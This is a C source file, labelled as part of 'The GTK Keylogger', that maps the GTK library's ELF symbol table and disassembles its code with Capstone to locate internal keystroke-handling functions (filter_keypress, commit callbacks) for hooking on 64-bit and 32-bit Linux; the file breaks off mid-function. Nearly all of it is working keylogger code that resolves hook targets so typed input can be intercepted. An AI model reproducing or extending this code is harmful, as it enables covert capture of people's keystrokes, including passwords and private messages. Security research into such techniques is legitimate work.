/*
 * This file is the source code supporting the address gathering of the methods to hook for the Ubuntu 14.04 LTS and
 * the Ubuntu 16.10 distributions.
 *
 * This is also part of The GTK Keylogger.
 *
 * Authors:
 *
 * Abel Romero Pérez aka D1W0U - abel@abelromero.com - @diw0u - http://www.abelromero.com 
 * David Reguera García aka Dreg - dreg@fr33project.org - @fr33project - http://www.fr33project.org
 *
 */


/*
 * Given the address of the gtk_im_context_simple_filter_keypress() function, this routine returns the address
 * of the gtk_im_context_simple_filter_keypress() in the GTK+ v2.24 library for Ubuntu 16.04, Ubuntu 16.10 & Debian 8.7 jessie (stable).
 */

#ifdef __x86_64__

  unsigned long Get_gtk3_im_multicontext_commit_cb_addr(char *graphic_lib_path)
  {
    unsigned char *dlsym_faddr;
    int so_fd;
    char *so_map;
    struct stat so_fd_stat;
    Elf64_Ehdr *elf_hdr;
    Elf64_Shdr *elf_secs; /* elf sections */
    Elf64_Sym *elf_symtab; /* elf symbols table */
    Elf64_Sym *elf_symtab_end; /* elf symbols table */
    char *elf_strtab; /* elf string symbol table */
    unsigned long foff; /* function offset of the jmpq */
    int i;
    Elf64_Addr faddr; /* gtk_im_multicontext_set_context_id() dynamic symbol addr */
    csh handle;
    cs_insn *insn;
    size_t count;

    /*
    * ¿Por qué abro la libgtk+ y la mapeo, y no uso dlsym() y capstone directamente?
    *
    * Abro la librería libgtk+ y la mapeo, luego busco el símbolo y después uso dlsym() y no uso directamente
    * dlsym() y capstone porque la función a la que llama el símbolo (gtk_im_multicontext_set_slave) no hace un call
    * si no un jmp y por tanto el código asm, no es procesable genéricamente, porque el compilador podría usar cada vez
    * unos registros distintos. Entonces, aprovechando que la sección de símbolos tiene el tamaño de la función exportada,
    * y que el jmp está al final y el código fuente no varía en toda la v3, me pongo al final del desensamblado y saco
    * el offset, porque el jmp siempre está al final.
    */

    /* looking for gtk_im_multicontext_set_context_id() symbol  */
    so_fd = open(graphic_lib_path, O_RDONLY);
    if (so_fd == -1)
    {
      perror("open()");
      return -1;
    }

    if (fstat(so_fd, &so_fd_stat) == -1)
    {
      perror("fstat()");
      return -1;
    }

    so_map = (char *)mmap(0, so_fd_stat.st_size, PROT_READ, MAP_SHARED, so_fd, 0);
    if (so_map == MAP_FAILED)
    {
      perror("mmap()");
      return -1;
    }

    elf_hdr = (Elf64_Ehdr *) so_map; // the beggining of the binary and the ELF header.
    elf_secs = (Elf64_Shdr *)(so_map + elf_hdr->e_shoff); // that should be an array of section types.
    for (i = 0; i < elf_hdr->e_shnum; i++)
    { // iterate into the amount of sections in the array of sections.
      if (elf_secs[i].sh_type == SHT_DYNSYM)
      { // if the section type is the dynamic symbol table, then:
        elf_symtab = (Elf64_Sym *)(so_map + elf_secs[i].sh_offset); // point to the dynamic symbol table.
        elf_symtab_end = (Elf64_Sym *)(so_map + elf_secs[i].sh_offset + elf_secs[i].sh_size); // point to the end of the symbol table.
        elf_strtab = so_map + elf_secs[elf_secs[i].sh_link].sh_offset; // point to the string symbol table.
        break;
      }
    }

    while(elf_symtab < elf_symtab_end)
    {
      char *fname = &elf_strtab[elf_symtab->st_name];
      faddr = elf_symtab->st_value;

      if (strlen(fname) == 34
        && strncmp(fname, "gtk_im_multicontext_set_context_id", 34) == 0)
      {
        //printf("%s is at offset 0x%lx with size %lu\n", fname, faddr, elf_symtab->st_size);
        break;
      }

      elf_symtab++;
    }

    if (elf_symtab == elf_symtab_end)
    {
      fprintf(stderr, "gtk_im_multicontext_set_context_id symbol not found\n");
      return -1;
    }

    dlsym_faddr = (unsigned char *)dlsym(RTLD_DEFAULT, "gtk_im_multicontext_set_context_id"); // get the first address of the match
    if (dlsym_faddr == NULL)
    {
      perror("dlsym()");
      return -1;
    }

    printf("gtk_im_multicontext_set_context_id() is at address %p\n", dlsym_faddr);

    // looking for jmpq gtk_im_multicontext_set_slave
    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -1;
    }

    // disassemble the last jmp
    count = cs_disasm(handle,
      (unsigned char *)so_map + faddr + (elf_symtab->st_size - 5),
      5,
      (unsigned long)dlsym_faddr + (elf_symtab->st_size - 5),
      0,
      &insn);

    if (count <= 0)
    {
      fprintf(stderr, "cs_disasm(1)\n");
      cs_close(&handle);
      return -1;
    }

    foff = insn[0].bytes[1]
      | (insn[0].bytes[2] << 8)
      | (insn[0].bytes[3] << 16)
      | (insn[0].bytes[4] << 24);

    foff = insn[0].address + insn[0].size + foff;

    printf("gtk_im_multicontext_set_slave() is at address 0x%lx\n", foff);

    // looking for gtk_im_multicontext_commit_cb()
    count = cs_disasm(handle, (unsigned char *) foff, 0x100, foff, 0, &insn);
    if (count <= 0)
    {
      fprintf(stderr, "cs_disasm(2)\n");
      cs_close(&handle);
      return -1;
    }

    size_t j;
    int lea_c = 0;
    for (j = 0; j < count; j++)
    {

      // count until the 4th lea and that's the offset from rip to gtk_im_multicontext_commit_cb()
      if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
      {
        lea_c++;
        if (lea_c == 4)
        {
          foff = insn[j].bytes[3]
            | (insn[j].bytes[4] << 8)
            | (insn[j].bytes[5] << 16)
            | (insn[j].bytes[6] << 24);

          foff = insn[j].address + insn[j].size + foff;

          printf("gtk_im_multicontext_commit_cb() is at address 0x%lx\n", foff);

          cs_free(insn, count);
          cs_close(&handle);

          /* the address of the function to hook was found */
          return foff;
        }
      }
    }

    cs_free(insn, count);
    cs_close(&handle);

    munmap(so_map, so_fd_stat.st_size);

    return 0;
  }

  unsigned long Get_gtk2_im_context_simple_filter_keypress_addr()
  {
    unsigned char *dlsym_faddr;
    unsigned long foff; /* function offset */
    csh handle;
    cs_insn *insn;
    size_t count;
    char got_offset = 0;

    dlsym_faddr = dlsym(RTLD_DEFAULT, "gtk_im_context_simple_new");

    if (dlsym_faddr == NULL)
    {
      fprintf(stderr, "gtk_im_context_simple_new exported symbol not found!\n");
      return -1;
    }
    else
    {
      printf("gtk_im_context_simple_new is at address %p\n", dlsym_faddr);
    }

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -4;
    }

    // take the offset of the first call
    count = cs_disasm(handle, dlsym_faddr, 32, (unsigned long)dlsym_faddr, 0, &insn);
    if (count > 0)
    {
      size_t j;

      for (j = 0; j < count; j++)
      {
        if (strncmp(insn[j].mnemonic, "call", 4) == 0 && strlen(insn[j].mnemonic) == 4)
        {
          foff = insn[j].bytes[1]
            | (insn[j].bytes[2] << 8)
            | (insn[j].bytes[3] << 16)
            | (insn[j].bytes[4] << 24);
          foff = (unsigned long)insn[j].address + insn[j].size + foff;

          printf("IA__gtk_im_context_simple_get_type offset at 0x%lx\n", foff);

          got_offset = 1;
          break;
        }
      }

      if (got_offset == 0)
      {
        fprintf(stderr, "IA__gtk_im_context_simple_get_type not found!\n");
        return -1;
      }

      got_offset = 0;
    }

    // looking for gtk_im_context_simple_class_intern_init():
    // count 3 calls then look for the 2nd lea and get offset.
    count = cs_disasm(handle, (unsigned char *)foff, 0x100, foff, 0, &insn);
    if (count > 0)
    {
      size_t j;
      int lea_c = 0;
      int call_c = 0;
      for (j = 0; j < count; j++)
      {
        if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
        {
          call_c++;
          if (call_c == 3)
          {
            for (; j < count; j++)
            {
              if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
              {
                lea_c++;

                if (lea_c == 2)
                {
                  foff = insn[j].bytes[3]
                    | (insn[j].bytes[4] << 8)
                    | (insn[j].bytes[5] << 16)
                    | (insn[j].bytes[6] << 24);

                  foff = (unsigned long)insn[j].address + insn[j].size + foff;

                  printf("gtk_im_context_simple_class_intern_init at offset 0x%lx\n", foff);

                  got_offset = 1;
                  break;
                }
              }
            }
          }
        }
      }
    }

    if (got_offset == 0)
    {
      fprintf(stderr, "gtk_im_context_simple_class_intern_init offset not found!\n");
      return -1;
    }

    got_offset = 0;

    // count until the 2nd call then the 3rd lea
    count = cs_disasm(handle, (unsigned char *)foff, 70, foff, 0, &insn);
    if (count > 0)
    {
      size_t j;
      int lea_c = 0;
      int call_c = 0;

      for (j = 0; j < count; j++)
      {
        if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0) {
          call_c++;

          if (call_c == 2)
          {
            for (; j < count; j++)
            {
              if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
              {
                lea_c++;

                if (lea_c == 1)
                {
                  foff = insn[j].bytes[3]
                    | (insn[j].bytes[4] << 8)
                    | (insn[j].bytes[5] << 16)
                    | (insn[j].bytes[6] << 24);

                  foff = (unsigned long)insn[j].address + insn[j].size + foff;

                  printf("gtk_im_context_simple_filter_keypress at offset 0x%lx\n", foff);

                  got_offset = 1;
                  break;
                }
              }
            }
            break;
          }
        }
      }

      if (got_offset == 0)
      {
        fprintf(stderr, "gtk_im_context_simple_filter_keypress offset not found!\n");
        return -1;
      }

      got_offset = 0;
    }

    cs_free(insn, count);
    cs_close(&handle);

    return foff;
  }

  unsigned long Get_gtk2_im_multicontext_commit_cb_addr(char *graphic_lib_path)
  {
    return Get_gtk3_im_multicontext_commit_cb_addr(graphic_lib_path);
  }

  // this func returns the address of the named gtk2 method.
  unsigned long Get_gtk2_im_multicontext_filter_keypress_addr()
  {
    unsigned char *dlsym_faddr;
    unsigned long foff; /* function offset */
    csh handle;
    cs_insn *insn;
    size_t count;
    char got_offset = 0;

    dlsym_faddr = dlsym(RTLD_DEFAULT, "gtk_im_multicontext_new");

    if (dlsym_faddr == NULL)
    {
      fprintf(stderr, "gtk_im_multicontext_new exported symbol not found!\n");
      return -1;
    }
    else
    {
      printf("gtk_im_multicontext_new is at address %p\n", dlsym_faddr);
    }

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -4;
    }

    // take the offset of the first call
    count = cs_disasm(handle, dlsym_faddr, 32, (unsigned long)dlsym_faddr, 0, &insn);
    if (count > 0)
    {
      size_t j;
      for (j = 0; j < count; j++)
      {
        if (strncmp(insn[j].mnemonic, "call", 4) == 0 && strlen(insn[j].mnemonic) == 4)
        {
          foff = insn[j].bytes[1]
            | (insn[j].bytes[2] << 8)
            | (insn[j].bytes[3] << 16)
            | (insn[j].bytes[4] << 24);

          foff = (unsigned long)insn[j].address + insn[j].size + foff;
          printf("IA__gtk_im_multicontext_get_type offset at 0x%lx\n", foff);

          got_offset = 1;
          break;
        }
      }
      if (got_offset == 0)
      {
        fprintf(stderr, "IA__gtk_im_multicontext_get_type not found!\n");
        return -1;
      }

      got_offset = 0;
    }

    // looking for gtk_im_context_simple_class_intern_init():
    // count 3 calls then look for the 2nd lea and get offset.
    count = cs_disasm(handle, (unsigned char *)foff, 0x100, foff, 0, &insn);
    if (count > 0)
    {
      size_t j;
      int lea_c = 0;
      int call_c = 0;
      for (j = 0; j < count; j++)
      {
        if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0) {
          call_c++;
          if (call_c == 3)
          {
            for (; j < count; j++)
            {
              if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
              {
                lea_c++;
                if (lea_c == 2)
                {
                  foff = insn[j].bytes[3]
                    | (insn[j].bytes[4] << 8)
                    | (insn[j].bytes[5] << 16)
                    | (insn[j].bytes[6] << 24);

                  foff = (unsigned long)insn[j].address + insn[j].size + foff;
                  printf("gtk_im_multicontext_class_intern_init at offset 0x%lx\n", foff);

                  got_offset = 1;
                  break;
                }
              }
            }
          }
        }
      }
    }

    if (got_offset == 0)
    {
      fprintf(stderr, "gtk_im_multicontext_class_intern_init offset not found!\n");
      return -1;
    }

    got_offset = 0;

    // count until the 2nd call then the 2nd lea
    count = cs_disasm(handle, (unsigned char *)foff, 0x100, foff, 0, &insn);
    if (count > 0)
    {
      size_t j;
      int lea_c = 0;
      int call_c = 0;

      for (j = 0; j < count; j++)
      {
        if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
        {
          call_c++;
          if (call_c == 2)
          {
            for (; j < count; j++)
            {
              if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
              {
                lea_c++;
                if (lea_c == 3)
                {
                  foff = insn[j].bytes[3]
                    | (insn[j].bytes[4] << 8)
                    | (insn[j].bytes[5] << 16)
                    | (insn[j].bytes[6] << 24);

                  foff = (unsigned long)insn[j].address + insn[j].size + foff;
                  printf("gtk_im_multicontext_filter_keypress at offset 0x%lx\n", foff);
                  got_offset = 1;
                  break;
                }
              }
            }

            break;
          }
        }
      }

      if (got_offset == 0)
      {
        fprintf(stderr, "gtk_im_multicontext_filter_keypress offset not found!\n");
        return -1;
      }
      got_offset = 0;
    }

    cs_free(insn, count);
    cs_close(&handle);

    return foff;
  }

  // this func returns the address of the named gtk3 method.
  unsigned long Get_gtk3_im_multicontext_filter_keypress_addr()
  {
    unsigned char *dlsym_faddr;
    unsigned long foff; /* function offset */
    csh handle;
    cs_insn *insn;
    size_t count;
    char got_offset = 0;

    dlsym_faddr = dlsym(RTLD_DEFAULT, "gtk_im_multicontext_new");

    if (dlsym_faddr == NULL)
    {
      fprintf(stderr, "gtk_im_multicontext_new exported symbol not found!\n");
      return -1;
    }
    else
    {
      printf("gtk_im_multicontext_new is at address %p\n", dlsym_faddr);
    }

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -4;
    }

    // take the offset of the first call
    count = cs_disasm(handle, dlsym_faddr, 32, (unsigned long)dlsym_faddr, 0, &insn);
    if (count > 0)
    {
      size_t j;
      for (j = 0; j < count; j++)
      {
        if (strncmp(insn[j].mnemonic, "call", 4) == 0 && strlen(insn[j].mnemonic) == 4)
        {
          foff = insn[j].bytes[1]
            | (insn[j].bytes[2] << 8)
            | (insn[j].bytes[3] << 16)
            | (insn[j].bytes[4] << 24);

          foff = (unsigned long)insn[j].address + insn[j].size + foff;
          printf("IA__gtk_im_multicontext_get_type offset at 0x%lx\n", foff);

          got_offset = 1;
          break;
        }
      }
      if (got_offset == 0)
      {
        fprintf(stderr, "IA__gtk_im_multicontext_get_type not found!\n");
        return -1;
      }
      got_offset = 0;
    }

    // looking for gtk_im_context_simple_class_intern_init():
    // count 3 calls then look for the 2nd lea and get offset.
    count = cs_disasm(handle, (unsigned char *)foff, 0x100, foff, 0, &insn);
    if (count > 0)
    {
      size_t j;
      int lea_c = 0;
      int call_c = 0;
      for (j = 0; j < count; j++)
      {
        if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
        {
          call_c++;
          if (call_c == 3)
          {
            for (; j < count; j++)
            {
              if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
              {
                lea_c++;
                if (lea_c == 2)
                {
                  foff = insn[j].bytes[3]
                    | (insn[j].bytes[4] << 8)
                    | (insn[j].bytes[5] << 16)
                    | (insn[j].bytes[6] << 24);

                  foff = (unsigned long)insn[j].address + insn[j].size + foff;

                  printf("gtk_im_multicontext_class_intern_init at offset 0x%lx\n", foff);

                  got_offset = 1;

                  break;
                }
              }
            }
          }
        }
      }
    }

    if (got_offset == 0)
    {
      fprintf(stderr, "gtk_im_multicontext_class_intern_init offset not found!\n");
      return -1;
    }
    got_offset = 0;

    // count until the 2nd call then the 3rd lea
    count = cs_disasm(handle, (unsigned char *)foff, 0x100, foff, 0, &insn);
    if (count > 0)
    {
      size_t j;
      int lea_c = 0;
      int call_c = 0;

      for (j = 0; j < count; j++)
      {
        if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
        {
          call_c++;
          if (call_c == 2)
          {
            for (; j < count; j++)
            {
              if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
              {
                lea_c++;
                if (lea_c == 4)
                {
                  foff = insn[j].bytes[3]
                    | (insn[j].bytes[4] << 8)
                    | (insn[j].bytes[5] << 16)
                    | (insn[j].bytes[6] << 24);

                  foff = (unsigned long)insn[j].address + insn[j].size + foff;
                  printf("gtk_im_multicontext_filter_keypress at offset 0x%lx\n", foff);

                  got_offset = 1;

                  break;
                }
              }
            }

            break;
          }
        }
      }

      if (got_offset == 0)
      {
        fprintf(stderr, "gtk_im_multicontext_filter_keypress offset not found!\n");
        return -1;
      }

      got_offset = 0;
    }

    cs_free(insn, count);
    cs_close(&handle);

    return foff;
  }

  unsigned long Get_gtk2_im_context_simple_commit_char_addr(unsigned long gtk_im_context_simple_filter_keypress)
  {

    unsigned long foff; /* function offset */
    csh handle;
    cs_insn *insn;
    size_t count;
    char got_offset = 0;


    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -4;
    }

    count = cs_disasm(handle,
      (unsigned char *)gtk_im_context_simple_filter_keypress,
      2300,
      gtk_im_context_simple_filter_keypress,
      0,
      &insn);

    if (count > 0)
    {
      size_t j;
      int call_c = 0;
      for (j = 0; j < count; j++)
      {
        if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0) {
          call_c++;
          if (call_c == 10)
          {
            foff = insn[j].bytes[1]
              | (insn[j].bytes[2] << 8)
              | (insn[j].bytes[3] << 16)
              | (insn[j].bytes[4] << 24);
            foff = (unsigned long)insn[j].address + insn[j].size + foff;

            printf("gtk_im_context_simple_commit_char at offset 0x%lx\n", foff);

            got_offset = 1;
            break;
          }
        }
      }

      if (got_offset == 0)
      {
        fprintf(stderr, "gtk_im_context_simple_commit_char offset not found!\n");
        return -1;
      }

      got_offset = 0;
    }

    cs_free(insn, count);
    cs_close(&handle);

    return foff;
  }

#else

  unsigned long Get_gtk3_im_multicontext_commit_cb_addr(char *graphic_lib_path)
  {
    unsigned char *dlsym_faddr;
    int so_fd;
    char *so_map;
    struct stat so_fd_stat;
    Elf32_Ehdr *elf_hdr;
    Elf32_Shdr *elf_secs; /* elf sections */
    Elf32_Sym *elf_symtab; /* elf symbols table */
    Elf32_Sym *elf_symtab_end; /* elf symbols table */
    char *elf_strtab; /* elf string symbol table */
    unsigned long foff; /* function offset of the jmpq */
    int i;
    Elf32_Addr faddr; /* gtk_im_multicontext_set_context_id() dynamic symbol addr */
    csh handle;
    cs_insn *insn;
    size_t count;


    /*
    * ¿Por qué abro la libgtk+ y la mapeo, y no uso dlsym() y capstone directamente?
    *
    * Abro la librería libgtk+ y la mapeo, luego busco el símbolo y después uso dlsym() y no uso directamente
    * dlsym() y capstone porque la función a la que llama el símbolo (gtk_im_multicontext_set_slave) no hace un call
    * si no un jmp y por tanto el código asm, no es procesable genéricamente, porque el compilador podría usar cada vez
    * unos registros distintos. Entonces, aprovechando que la sección de símbolos tiene el tamaño de la función exportada,
    * y que el jmp está al final y el código fuente no varía en toda la v3, me pongo al final del desensamblado y saco
    * el offset, porque el jmp siempre está al final.
    */

    /* looking for gtk_im_multicontext_set_context_id() symbol  */
    so_fd = open(graphic_lib_path, O_RDONLY);
    if (so_fd == -1)
    {
      perror("open()");
      return -1;
    }

    if (fstat(so_fd, &so_fd_stat) == -1)
    {
      perror("fstat()");
      return -1;
    }

    so_map = (char *)mmap(0, so_fd_stat.st_size, PROT_READ, MAP_SHARED, so_fd, 0);
    if (so_map == MAP_FAILED)
    {
      perror("mmap()");
      return -1;
    }

    elf_hdr = (Elf32_Ehdr *) so_map; // the beggining of the binary and the ELF header.
    elf_secs = (Elf32_Shdr *)(so_map + elf_hdr->e_shoff); // that should be an array of section types.
    for (i = 0; i < elf_hdr->e_shnum; i++)
    { // iterate into the amount of sections in the array of sections.
      if (elf_secs[i].sh_type == SHT_DYNSYM)
      { // if the section type is the dynamic symbol table, then:
        elf_symtab = (Elf32_Sym *)(so_map + elf_secs[i].sh_offset); // point to the dynamic symbol table.
        elf_symtab_end = (Elf32_Sym *)(so_map + elf_secs[i].sh_offset + elf_secs[i].sh_size); // point to the end of the symbol table.
        elf_strtab = so_map + elf_secs[elf_secs[i].sh_link].sh_offset; // point to the string symbol table.
        break;
      }
    }

    while(elf_symtab < elf_symtab_end)
    {
      char *fname = &elf_strtab[elf_symtab->st_name];
      faddr = elf_symtab->st_value;

      if (strlen(fname) == 34
        && strncmp(fname, "gtk_im_multicontext_set_context_id", 34) == 0)
      {
        //printf("%s is at offset 0x%lx with size %lu\n", fname, faddr, elf_symtab->st_size);
        break;
      }

      elf_symtab++;
    }

    if (elf_symtab == elf_symtab_end)
    {
      fprintf(stderr, "gtk_im_multicontext_set_context_id symbol not found\n");
      return -1;
    }

    dlsym_faddr = (unsigned char *)dlsym(RTLD_DEFAULT, "gtk_im_multicontext_set_context_id"); // get the first address of the match
    if (dlsym_faddr == NULL)
    {
      perror("dlsym()");
      return -1;
    }

    printf("gtk_im_multicontext_set_context_id() is at address %p\n", dlsym_faddr);

    // looking for jmpq gtk_im_multicontext_set_slave
    if (cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -1;
    }

    // disassemble the last jmp
    count = cs_disasm(handle,
      (unsigned char *)so_map + faddr + (elf_symtab->st_size - 5),
      5,
      (unsigned long)dlsym_faddr + (elf_symtab->st_size - 5),
      0,
      &insn);

    if (count <= 0)
    {
      fprintf(stderr, "cs_disasm(1)\n");
      cs_close(&handle);
      return -1;
    }

    foff = insn[0].bytes[1]
      | (insn[0].bytes[2] << 8)
      | (insn[0].bytes[3] << 16)
      | (insn[0].bytes[4] << 24);

    foff = insn[0].address + insn[0].size + foff;

    printf("gtk_im_multicontext_set_slave() is at address 0x%lx\n", foff);

    // looking for gtk_im_multicontext_commit_cb()
    count = cs_disasm(handle, (unsigned char *) foff, 500, foff, 0, &insn);
    if (count <= 0)
    {
      fprintf(stderr, "cs_disasm(2)\n");
      cs_close(&handle);
      return -1;
    }

    size_t j;
    for (j = 0; j < count; j++)
    {
      // in x86 we search for the first call which is to __x86.get_pc_thunk.bx (rip-relative like trick for x86) and took the next instruction's offset which is and add,
      // then search for the corresponding lea to ebx and calculate the address of gtk_im_multicontext_commit_cb().
      if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
      {
        int add_qty = 0, call_c = 0;
        unsigned long address = 0;

        if (strlen(insn[j + 1].mnemonic) == 3 && strncmp(insn[j + 1].mnemonic, "add", 3) == 0)
        {
          add_qty = insn[j + 1].bytes[2]
            | (insn[j + 1].bytes[3] << 8)
            | (insn[j + 1].bytes[4] << 16)
            | (insn[j + 1].bytes[5] << 24);

          // save the address after the call is the (esp) value we're looking for, which is saved on ebx in the __x86.get_pc_thunk.bx func.
          address = insn[j + 1].address;

          // after the the 11th call there should be a lea, this lea is the correct one. Take its offset and calculate the address we are looking for.
          for(j += 2; j < count; j++)
          {
            if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
            {
              call_c ++;

              if (call_c == 3)
              {
                for (; j < count; j++)
                {
                  if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
                  {
                    foff = insn[j].bytes[2]
                      | (insn[j].bytes[3] << 8)
                      | (insn[j].bytes[4] << 16)
                      | (insn[j].bytes[5] << 24);

                    if (foff < 0)
                    {
                      foff = address + add_qty + (0 - foff);
                    }
                    else
                    {
                      foff = address + add_qty + foff;
                    }
                    printf("gtk_im_multicontext_commit_cb is at address 0x%lx\n", foff);

                    cs_free(insn, count);
                    cs_close(&handle);

                    munmap(so_map, so_fd_stat.st_size);

                    return foff;
                  }
                }
              }
            }
          }

          break;
        }
        else
        {
          fprintf(stderr, "add to ebx not found!\n");
        }
      }
    }

    cs_free(insn, count);
    cs_close(&handle);

    munmap(so_map, so_fd_stat.st_size);

    return 0;
  }

  unsigned long Get_gtk3_im_multicontext_filter_keypress_addr()
  {
    unsigned char *dlsym_faddr;
    unsigned long foff; /* function offset */
    csh handle;
    cs_insn *insn;
    size_t count;

    dlsym_faddr = dlsym(RTLD_DEFAULT, "gtk_im_multicontext_new");

    if (dlsym_faddr == NULL)
    {
      fprintf(stderr, "gtk_im_multicontext_new exported symbol not found!\n");
      return -1;
    }
    else
    {
      printf("gtk_im_multicontext_new is at address %p\n", dlsym_faddr);
    }

    if (cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
      fprintf(stderr, "cs_open(): error\n");
      return -4;
    }

    // take the offset of the first call
    count = cs_disasm(handle, dlsym_faddr, 32, (unsigned long)dlsym_faddr, 0, &insn);
    if (count > 0)
    {
      size_t j;
      for (j = 0; j < count; j++)
      {
        if (strncmp(insn[j].mnemonic, "call", 4) == 0 && strlen(insn[j].mnemonic) == 4)
        {
          foff = insn[j].bytes[1]
            | (insn[j].bytes[2] << 8)
            | (insn[j].bytes[3] << 16)
            | (insn[j].bytes[4] << 24);

          foff = (unsigned long)insn[j].address + insn[j].size + foff;
          printf("gtk_im_multicontext_get_type offset at 0x%lx\n", foff);

          count = cs_disasm(handle, dlsym_faddr, 32, (unsigned long)dlsym_faddr, 0, &insn);
          if (count > 0)
          {
            size_t j;
            int call_c = 0;

            for (j = 0; j < count; j++)
            {
              if (strncmp(insn[j].mnemonic, "call", 4) == 0 && strlen(insn[j].mnemonic) == 4)
              {
                call_c ++;

                if (call_c == 2)
                {
                  foff = insn[j].bytes[1]
                    | (insn[j].bytes[2] << 8)
                    | (insn[j].bytes[3] << 16)
                    | (insn[j].bytes[4] << 24);

                  foff = (unsigned long)insn[j].address + insn[j].size + foff;

                  printf("gtk_im_multicontext_get_type offset at 0x%lx\n", foff);

                  count = cs_disasm(handle, (void *) foff, 130, (unsigned long)foff, 0, &insn);

                  for (j = 0; j < count; j++)
                  {
                    // in x86 we search for the first call which is to __x86.get_pc_thunk.bx (rip-relative like trick for x86)
                    // and took the next instruction's offset which is and add, then search for the 2nd lea to ebx and calculate
                    // the address of the next function we are looking for.
                    if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                    {
                      int add_qty = 0, call_c = 0, lea_c = 0;
                      unsigned long address = 0;

                      if (strlen(insn[j + 1].mnemonic) == 3 && strncmp(insn[j + 1].mnemonic, "add", 3) == 0)
                      {
                        add_qty = insn[j + 1].bytes[2]
                          | (insn[j + 1].bytes[3] << 8)
                          | (insn[j + 1].bytes[4] << 16)
                          | (insn[j + 1].bytes[5] << 24);

                        // save the address after the call is the (esp) value we're looking for, which is saved on ebx in the __x86.get_pc_thunk.bx func.
                        address = insn[j + 1].address;

                        // after the the 11th call there should be a lea, this lea is the correct one. Take its offset and calculate the address we are looking for.
                        for(j += 2; j < count; j++)
                        {
                          if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                          {
                            call_c ++;

                            if (call_c == 3)
                            {
                              for (; j < count; j++)
                              {
                                if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
                                {
                                  lea_c ++;

                                  if (lea_c == 2)
                                  {
                                    foff = insn[j].bytes[2]
                                      | (insn[j].bytes[3] << 8)
                                      | (insn[j].bytes[4] << 16)
                                      | (insn[j].bytes[5] << 24);

                                    if (foff < 0)
                                    {
                                      foff = address + add_qty + (0 - foff);
                                    }
                                    else
                                    {
                                      foff = address + add_qty + foff;
                                    }

                                    printf("gtk_im_multicontext_class_intern_init is at address 0x%lx\n", foff);

                                    count = cs_disasm(handle, (void *) foff, 130, (unsigned long)foff, 0, &insn);

                                    for (j = 0; j < count; j++)
                                    {
                                      // in x86 we search for the first call which is to __x86.get_pc_thunk.bx (rip-relative like trick for x86)
                                      // and took the next instruction's offset which is and add, then search for the 2nd lea to ebx and calculate
                                      // the address of the next function we are looking for.
                                      if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                                      {
                                        int add_qty = 0, call_c = 0, lea_c = 0;
                                        unsigned long address = 0;

                                        if (strlen(insn[j + 1].mnemonic) == 3 && strncmp(insn[j + 1].mnemonic, "add", 3) == 0)
                                        {
                                          add_qty = insn[j + 1].bytes[2]
                                            | (insn[j + 1].bytes[3] << 8)
                                            | (insn[j + 1].bytes[4] << 16)
                                            | (insn[j + 1].bytes[5] << 24);

                                          // save the address after the call is the (esp) value we're looking for, which is saved on ebx in the __x86.get_pc_thunk.bx func.
                                          address = insn[j + 1].address;

                                          // after the the 11th call there should be a lea, this lea is the correct one. Take its offset and calculate the address we are looking for.
                                          for(j += 2; j < count; j++)
                                          {
                                            if (strlen(insn[j].mnemonic) == 4 && strncmp(insn[j].mnemonic, "call", 4) == 0)
                                            {
                                              call_c ++;

                                              if (call_c == 2)
                                              {
                                                for (; j < count; j++)
                                                {
                                                  if (strlen(insn[j].mnemonic) == 3 && strncmp(insn[j].mnemonic, "lea", 3) == 0)
                                                  {
                                                    lea_c ++;

                                                    if (lea_c == 4)
                                                    {
                                                      foff = insn[j].bytes[2]
                                                        | (insn[j].bytes[3] << 8)
                                                        | (insn[j].bytes[4] << 16)
                                                        | (insn[j].bytes[5] << 24);

                                                      if (foff < 0)
                                                      {
                                                        foff = address + add_qty + (0 - foff);
                                                      }
                                                      else
                                                      {
                                                        foff = address + add_qty + foff;
                                                      }

